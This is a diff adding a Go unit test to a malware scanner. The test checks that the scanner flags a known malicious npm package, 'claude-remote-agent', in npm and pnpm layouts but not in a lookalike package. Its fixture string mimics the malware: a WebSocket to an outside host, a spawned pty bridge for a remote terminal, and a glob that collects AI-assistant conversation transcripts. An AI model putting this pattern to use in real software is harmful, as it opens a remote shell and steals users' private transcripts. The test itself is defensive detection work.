@@ -616,6 +616,54 @@ func TestScan_AmazonInspectorChainAnalyzeMalwareUnderNodeModules(t *testing.T) {
 	}
 }
 
+// TestScan_AmazonInspectorClaudeRemoteAgentUnderNodeModules proves the bounded
+// walker reaches the reviewed remote-terminal and transcript-theft source in
+// npm and pnpm layouts without scanning a lookalike package root.
+func TestScan_AmazonInspectorClaudeRemoteAgentUnderNodeModules(t *testing.T) {
+	raw := []byte(`const socket = new WebSocket("wss://claude.pishchykau.eu"); spawn("python3", ["pty-bridge.py"]); if (action === "list-conversations") return glob("~/.claude/projects/*.jsonl");`)
+	layouts := []struct {
+		name string
+		rel  string
+	}{
+		{"npm", filepath.Join("node_modules", "claude-remote-agent", "agent.js")},
+		{"pnpm", filepath.Join("node_modules", ".pnpm", "claude-remote-agent@0.1.2", "node_modules", "claude-remote-agent", "agent.js")},
+	}
+	for _, layout := range layouts {
+		t.Run(layout.name, func(t *testing.T) {
+			root := t.TempDir()
+			payload := filepath.Join(root, layout.rel)
+			if err := os.MkdirAll(filepath.Dir(payload), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(payload, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			lookalike := filepath.Join(root, "node_modules", "other-package", "agent.js")
+			if err := os.MkdirAll(filepath.Dir(lookalike), 0o755); err != nil {
+				t.Fatal(err)
+			}
+			if err := os.WriteFile(lookalike, raw, 0o644); err != nil {
+				t.Fatal(err)
+			}
+
+			res, err := scan.Run(context.Background(), scan.Options{Roots: []string{root}})
+			if err != nil {
+				t.Fatalf("scan: %v", err)
+			}
+			got := 0
+			for _, f := range res.Findings {
+				if f.RuleID == "amazon-inspector-npm-malware-ioc" {
+					got++
+				}
+			}
+			if got != 1 {
+				t.Fatalf("amazon-inspector-npm-malware-ioc findings = %d, want 1; findings=%+v", got, res.Findings)
+			}
+		})
+	}
+}
+
 // TestScan_AsyncAPIMiasmaPayloadUnderNodeModules asserts that node_modules
 // stays skipped except for exact AsyncAPI campaign paths carrying a known IOC.
 func TestScan_AsyncAPIMiasmaPayloadUnderNodeModules(t *testing.T) {
